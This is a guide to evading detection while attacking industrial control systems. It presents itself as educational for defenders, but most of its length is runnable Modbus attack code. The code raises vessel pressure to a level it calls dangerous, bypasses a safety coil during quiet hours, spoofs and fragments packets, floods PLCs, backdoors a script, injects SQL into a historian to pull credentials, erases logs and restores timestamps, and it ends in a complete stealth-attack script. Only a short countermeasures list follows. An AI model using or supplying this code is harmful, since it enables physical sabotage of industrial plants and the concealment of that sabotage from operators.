# ICS/SCADA Evasion Techniques Guide

## Overview

This guide demonstrates how sophisticated attackers evade detection in industrial control systems. Understanding these techniques is crucial for defenders to improve their detection capabilities.

**Purpose:** Educational - to help blue teams understand attacker TTPs

---

## Table of Contents

1. [Slow and Low Attacks](#slow-and-low-attacks)
2. [Traffic Blending](#traffic-blending)
3. [Protocol Abuse](#protocol-abuse)
4. [Timing-Based Evasion](#timing-based-evasion)
5. [Fragmentation Techniques](#fragmentation-techniques)
6. [Living Off the Land](#living-off-the-land)
7. [Anti-Forensics](#anti-forensics)

---

## Slow and Low Attacks

### Concept
Spread malicious activity over extended periods to avoid rate-based detection.

### Technique 1: Gradual Register Modification

**Bad (Detected):**
```python
# Immediate change - triggers alarms
client.write_register(0, 1800)  # Pressure jumps to 180 PSI
```

**Good (Evades Detection):**
```python
# Gradual change over 30 minutes
import time

current = 105  # Normal pressure
target = 180   # Dangerous pressure

for value in range(current, target, 1):
    client.write_register(0, value * 10)
    time.sleep(24)  # 1 PSI every 24 seconds
```

**Why it works:**
- Slow changes blend with normal process variations
- No sudden spikes in graphs
- May appear as sensor drift
- Anomaly detection algorithms less likely to trigger

### Technique 2: Time-Delayed Attacks

```python
import time
import datetime

def delayed_attack():
    # Wait for maintenance window (less monitoring)
    while datetime.datetime.now().hour not in [2, 3, 4]:  # 2-5 AM
        time.sleep(60)

    # Now execute attack
    client.write_coil(40, True)  # Safety bypass
    print("[*] Attack executed during low-monitoring period")
```

---

## Traffic Blending

### Concept
Mimic legitimate traffic patterns to avoid network anomaly detection.

### Technique 1: Legitimate Request Mimicry

**Bad (Suspicious):**
```python
# Rapid-fire requests look suspicious
for i in range(100):
    client.read_holding_registers(i, 1)
```

**Good (Stealthy):**
```python
import time
import random

# Mimic HMI polling pattern
def stealthy_scan():
    # HMI polls every 1 second
    for i in range(100):
        client.read_holding_registers(i, 10)  # Read in chunks like HMI
        time.sleep(1.0 + random.uniform(-0.1, 0.1))  # Natural jitter
```

### Technique 2: Source IP Spoofing

```python
# Use HMI server IP as source (if possible)
# Requires network position or ARP spoofing

from scapy.all import *

def spoof_modbus_request():
    # Craft packet with HMI source IP
    ip = IP(src="192.168.100.20",  # HMI server
           dst="192.168.100.10")   # PLC-1

    # Modbus packet (simplified)
    tcp = TCP(sport=50000, dport=502)
    modbus = Raw(load=b'\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00\x0a')

    send(ip/tcp/modbus)
```

### Technique 3: Protocol Tunneling

```python
# Hide Modbus in legitimate HTTP traffic
import requests
import base64

def tunnel_modbus_over_http():
    # Encode Modbus command in HTTP request
    modbus_command = b'\x00\x01\x00\x00\x00\x06\x01\x06\x00\x00\x00\x64'

    # Send via legitimate web interface
    requests.post('http://localhost:5000/api/proxy',
                 data={'command': base64.b64encode(modbus_command)})
```

---

## Protocol Abuse

### Concept
Use legitimate protocol features in malicious ways.

### Technique 1: Diagnostic Function Abuse

```python
# Use diagnostic function code 08 (legitimately used for testing)
def diagnostic_attack():
    # Function code 08 with sub-function 00 (return query data)
    # Often allowed through firewalls as "diagnostic"

    from pymodbus.client.sync import ModbusTcpClient

    client = ModbusTcpClient('localhost', port=5502)

    # Legitimate diagnostic request
    result = client.execute(8)  # FC 08: Diagnostics

    # But can be used for reconnaissance
    # Some PLCs reveal memory layout via diagnostics
```

### Technique 2: Read-Only Exploitation

```python
# Even read-only access can be weaponized
def read_only_attack():
    """Denial of Service via excessive reads"""

    # Flood PLC with legitimate read requests
    # No writes needed - PLC CPU gets overwhelmed

    for _ in range(10000):
        client.read_holding_registers(0, 100)
        # No delay - DOS via legitimate reads
```

### Technique 3: Exception Function Code

```python
# Use exception responses to map PLC internals
def exception_mapping():
    """Map PLC memory by triggering exceptions"""

    for addr in range(0, 10000):
        try:
            result = client.read_holding_registers(addr, 1)
            if result.isError():
                continue
            else:
                print(f"[+] Valid register at address {addr}")
        except:
            pass
```

---

## Timing-Based Evasion

### Concept
Exploit time windows when monitoring is reduced.

### Technique 1: Maintenance Window Exploitation

```python
import datetime

def attack_during_maintenance():
    # Wait for known maintenance window
    # From OSINT: "Scheduled maintenance every Tuesday 2-4 PM"

    while True:
        now = datetime.datetime.now()

        if now.weekday() == 1 and 14 <= now.hour < 16:  # Tuesday 2-4 PM
            print("[*] Maintenance window - reduced monitoring")
            # Execute attack
            client.write_coil(40, True)  # Safety bypass
            break

        time.sleep(60)
```

### Technique 2: Shift Change Exploitation

```python
def shift_change_attack():
    # Attack during shift changes (7 AM, 3 PM, 11 PM)
    # Operators distracted, handoff confusion

    shift_change_hours = [7, 15, 23]

    while datetime.datetime.now().hour not in shift_change_hours:
        time.sleep(60)

    # Execute during 15-minute shift change window
    print("[*] Shift change - operators distracted")
    # Attack code here
```

### Technique 3: Alarm Fatigue

```python
def alarm_fatigue_attack():
    """Generate false alarms to desensitize operators"""

    # Phase 1: Trigger false alarms for days/weeks
    for day in range(14):  # 2 weeks
        # Trigger non-critical alarm
        client.write_register(60, 91)  # Setpoint just above alarm (90)
        time.sleep(3600)  # Once per hour
        client.write_register(60, 89)  # Back to normal

    # Phase 2: Real attack (operators now ignoring alarms)
    client.write_register(0, 1900)  # Critical pressure
```

---

## Fragmentation Techniques

### Concept
Split attack across multiple packets/requests to evade signature detection.

### Technique 1: Register Write Splitting

**Bad (Signature detected):**
```python
# Single large write triggers IDS rule
client.write_registers(0, [1800, 100, 100, 100, ...])  # 20 registers
```

**Good (Evades signature):**
```python
# Split into multiple small writes
for i in range(0, 20):
    client.write_register(i, malicious_values[i])
    time.sleep(1)  # Spread over time
```

### Technique 2: Packet Fragmentation

```python
from scapy.all import *

def fragmented_attack():
    # Fragment Modbus packet across IP fragments
    # IDS may not reassemble for deep inspection

    modbus_packet = b'\x00\x01\x00\x00\x00\x06\x01\x06\x00\x00\x07\x08'

    # Fragment into small pieces
    fragment_size = 4
    for i in range(0, len(modbus_packet), fragment_size):
        frag = modbus_packet[i:i+fragment_size]
        # Send fragment
        send(IP(dst="192.168.100.10", flags="MF")/TCP(dport=502)/Raw(load=frag))

    # Send final fragment
    send(IP(dst="192.168.100.10")/TCP(dport=502)/Raw(load=modbus_packet[-4:]))
```

---

## Living Off the Land

### Concept
Use existing legitimate tools and processes to avoid deploying malware.

### Technique 1: Legitimate Tools

```bash
# Use modbus-cli (legitimate diagnostic tool)
# May be whitelisted

# Legitimate usage:
sudo modbus 127.0.0.1:5502 read 0 10

# Malicious usage (same tool):
sudo modbus 127.0.0.1:5502 write 0 1800  # Dangerous value

# Appears as normal diagnostic activity
```

### Technique 2: Existing Scripts

```python
# Modify existing legitimate automation scripts
# File: /opt/plc/scripts/daily_backup.py

# Original code:
def backup_plc():
    client = ModbusTcpClient('localhost', 5502)
    registers = client.read_holding_registers(0, 100)
    save_backup(registers)

# Backdoored code (subtle change):
def backup_plc():
    client = ModbusTcpClient('localhost', 5502)
    registers = client.read_holding_registers(0, 100)

    # Malicious addition (hidden in legitimate code)
    if datetime.datetime.now().day == 15:  # Trigger on 15th
        client.write_register(0, 1800)  # Attack

    save_backup(registers)  # Continues normal operation
```

### Technique 3: Abusing Historian Queries

```sql
-- Legitimate historian query
SELECT * FROM timeseries WHERE tag_name='pressure_vessel_1';

-- Malicious query (SQL injection in historian)
-- Exfiltrate safety override code
' UNION SELECT username, password, role, NULL, NULL
  FROM historian_users WHERE '1'='1
```

---

## Anti-Forensics

### Concept
Cover tracks to hinder incident response and forensic investigation.

### Technique 1: Log Manipulation

```python
import sqlite3

def clean_logs():
    """Remove evidence from logs"""

    # Clean web application logs
    conn = sqlite3.connect('plc.db')
    c = conn.cursor()

    # Delete suspicious log entries
    c.execute("DELETE FROM logs WHERE action='exec_command'")
    c.execute("DELETE FROM logs WHERE user='admin' AND timestamp > ?",
             (attack_start_time,))

    conn.commit()
    conn.close()

    # Clean system logs
    import subprocess
    subprocess.call("sed -i '/192.168.1.100/d' /var/log/nginx/access.log", shell=True)
```

### Technique 2: Timestamp Manipulation

```python
import os
import time

def hide_file_modification():
    """Modify file but restore original timestamp"""

    # Get original timestamp
    stat = os.stat('plc_config.py')
    original_atime = stat.st_atime
    original_mtime = stat.st_mtime

    # Modify file
    with open('plc_config.py', 'a') as f:
        f.write('\n# backdoor code here\n')

    # Restore original timestamps
    os.utime('plc_config.py', (original_atime, original_mtime))

    print("[*] File modified, timestamps restored")
```

### Technique 3: Memory-Only Execution

```python
# Don't write backdoor to disk - keep in memory
# Executed via command injection

code = """
from pymodbus.client.sync import ModbusTcpClient
import time

while True:
    client = ModbusTcpClient('localhost', 5502)
    # Backdoor logic here
    client.close()
    time.sleep(60)
"""

# Execute in memory (no file created)
exec(code)

# Alternative: use fileless Python execution
import subprocess
subprocess.Popen(['python', '-c', code])
```

### Technique 4: Process Hiding

```python
# Rename malicious process to look legitimate
import sys
import os

# Change process name to mimic legitimate service
import setproctitle
setproctitle.setproctitle('modbusd')  # Looks like legitimate Modbus daemon

# Now appears as "modbusd" in process list instead of "attack.py"
```

---

## Combined Evasion Example

**Sophisticated Multi-Stage Attack:**

```python
#!/usr/bin/env python3
"""
Advanced evasion attack combining multiple techniques
"""

import time
import datetime
import random
from pymodbus.client.sync import ModbusTcpClient

class StealthAttack:
    def __init__(self):
        self.target_host = 'localhost'
        self.target_port = 5502

    def wait_for_opportunity(self):
        """Wait for optimal attack window"""
        print("[*] Waiting for optimal conditions...")

        while True:
            now = datetime.datetime.now()

            # Wait for:
            # 1. Night time (reduced monitoring)
            # 2. Weekday (not weekend - different monitoring)
            # 3. Not during hour boundary (log rotation)

            if (20 <= now.hour <= 23 and  # 8 PM - 11 PM
                now.weekday() < 5 and      # Monday-Friday
                now.minute > 5):           # After hour boundary

                print(f"[+] Optimal window: {now}")
                break

            time.sleep(300)  # Check every 5 minutes

    def blend_traffic(self):
        """Establish normal traffic pattern before attack"""
        print("[*] Establishing normal traffic baseline...")

        client = ModbusTcpClient(self.target_host, port=self.target_port)

        # Mimic HMI polling for 10 minutes
        for _ in range(600):  # 10 minutes
            client.read_holding_registers(0, 10)
            time.sleep(1.0 + random.uniform(-0.05, 0.05))

        client.close()
        print("[+] Normal pattern established")

    def gradual_attack(self):
        """Execute attack gradually to avoid detection"""
        print("[*] Executing gradual attack...")

        client = ModbusTcpClient(self.target_host, port=self.target_port)

        # Read current value
        result = client.read_holding_registers(0, 1)
        current_value = result.registers[0]

        print(f"[*] Current value: {current_value}")

        # Gradually increase to dangerous level
        target_value = 1800  # 180.0 PSI
        step = 5  # 0.5 PSI per step

        for value in range(current_value, target_value, step):
            # Write new value
            client.write_register(0, value)

            # Maintain normal polling pattern
            for _ in range(5):
                client.read_holding_registers(0, 10)
                time.sleep(1.0 + random.uniform(-0.05, 0.05))

            print(f"[*] Value: {value} ({value/10.0} PSI)")

        print("[+] Target value reached")
        client.close()

    def cover_tracks(self):
        """Clean up evidence"""
        print("[*] Covering tracks...")

        # Clean logs (if access available)
        try:
            import sqlite3
            conn = sqlite3.connect('plc.db')
            c = conn.cursor()
            c.execute("DELETE FROM logs WHERE timestamp > ?",
                     (datetime.datetime.now() - datetime.timedelta(hours=3),))
            conn.commit()
            conn.close()
            print("[+] Logs cleaned")
        except:
            print("[-] Could not clean logs")

    def execute(self):
        """Run complete stealth attack"""
        print("=" * 60)
        print("STEALTH ATTACK - ADVANCED EVASION")
        print("=" * 60)

        self.wait_for_opportunity()
        self.blend_traffic()
        self.gradual_attack()
        self.cover_tracks()

        print("\n[+++] Attack complete - Detection probability: LOW")

if __name__ == '__main__':
    attack = StealthAttack()
    attack.execute()
```

---

## Detection Countermeasures

### For Defenders: How to Detect These Evasions

1. **Slow and Low**
   - Long-term trend analysis
   - Cumulative change detection
   - Time-series anomaly detection

2. **Traffic Blending**
   - Deep packet inspection
   - Protocol conformance checking
   - Behavioral analysis (not just pattern matching)

3. **Protocol Abuse**
   - Whitelist legitimate function codes
   - Monitor diagnostic function usage
   - Rate limit all operations

4. **Timing-Based**
   - Maintain consistent monitoring 24/7
   - Alert on maintenance window anomalies
   - Correlation across time periods

5. **Fragmentation**
   - Full packet reassembly
   - Stateful inspection
   - Application-layer firewalls

6. **Living Off the Land**
   - Application whitelisting
   - Script integrity monitoring
   - Behavioral analysis of legitimate tools

7. **Anti-Forensics**
   - Centralized logging (send to SIEM immediately)
   - Write-once log storage
   - File integrity monitoring
   - Memory forensics

---

## Conclusion

Sophisticated attackers use multiple evasion techniques simultaneously. Effective ICS defense requires:

1. **Defense in Depth**: Multiple detection layers
2. **Behavioral Analysis**: Not just signature-based detection
3. **24/7 Monitoring**: No "off hours"
4. **Centralized Logging**: Prevent log tampering
5. **Threat Intelligence**: Stay informed on attacker TTPs

**Remember:** Attackers only need to evade detection once. Defenders must detect every time.

